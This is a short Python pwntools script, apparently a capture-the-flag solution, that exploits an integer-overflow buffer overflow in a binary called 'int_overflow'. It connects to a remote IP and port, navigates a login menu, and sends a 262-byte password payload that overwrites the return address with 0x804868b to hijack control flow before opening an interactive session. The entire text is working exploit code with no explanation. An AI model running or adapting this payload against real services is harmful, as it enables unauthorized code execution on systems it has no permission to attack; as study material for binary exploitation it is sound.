from pwn import *

#sh=process('./int_overflow')
sh=remote('111.198.29.45','30565')
sh.recvuntil('choice:')
sh.sendline('1')
sh.recvuntil('name:\n')
sh.sendline('name')
sh.recvuntil('passwd:\n')

sys= 0x804868b
pay = 'a'*0x18+p32(sys)
pay = pay.ljust(262,'a')
sh.sendline(pay)

#gdb.attach(sh)
sh.interactive()
